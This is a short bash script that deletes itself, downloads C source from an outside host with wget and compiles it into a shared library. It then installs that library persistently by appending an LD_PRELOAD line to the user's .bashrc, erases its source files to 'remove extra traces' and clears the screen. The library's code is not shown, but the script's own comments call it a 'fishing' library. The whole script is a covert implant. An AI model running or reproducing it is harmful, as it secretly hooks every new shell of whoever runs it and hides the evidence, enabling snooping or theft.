#!/bin/bash
# Copyright 2008 MTS productions

FISK_DIR=$HOME/.local/share/fisk

# Paranoia ftw.
LD_PRELOAD=""

# We never ran
rm $0

# Set up directories
mkdir -p $FISK_DIR
pushd $FISK_DIR

# Remove any leftover files from earlier fishings
rm -f libfisk.c libfisk.o libfisk.so

# Download sources, and adjust paths (probably a better way to do this)
wget http://home.samfundet.no/~sandsmark/libfisk.c
sed -e s,%FISK_DIR%,$FISK_DIR, -i libfisk.c

# Compile the fishing library
gcc -c -fPIC libfisk.c -D_GNU_SOURCE -Wall
gcc -shared -fPIC -o libfisk.so libfisk.o -ldl -Wall

# Take a backup of the clean bashrc
cp $HOME/.bashrc $FISK_DIR/bashrc

# Make sure our library is preloaded next time a shell is spawned
echo "LD_PRELOAD=$FISK_DIR/libfisk.so" >> $HOME/.bashrc

# Remove extra traces 
rm -f libfisk.c libfisk.o
popd

echo "Fishing done..."
sleep 3
clear

